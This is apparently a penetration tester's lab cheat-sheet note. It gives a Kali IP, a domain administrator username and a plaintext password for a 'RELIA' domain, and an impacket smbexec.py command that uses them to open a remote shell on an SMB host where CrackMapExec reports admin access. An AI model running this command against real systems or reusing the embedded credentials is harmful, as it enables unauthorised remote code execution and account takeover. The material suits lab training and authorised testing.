---
IP_KALI: 192.168.45.155
USER: Administrator
PASSWD: DonovanJadeKnight1
DOMAIN: RELIA
IP_TARGET:
---
If a user has Administrative access (i.e. CME shows pwn3d) to an SMB share then you can initiate a reverse shell
- ~={green}python ~/impacket/examples/smbexec.py <span id="DOMAIN"/>RELIA<span type="end"/>/<span id="USER"/>Administrator<span type="end"/>:"<span id="PASSWD"/>DonovanJadeKnight1<span type="end"/>"@<span id="IP_TARGET"/>null<span type="end"/>=~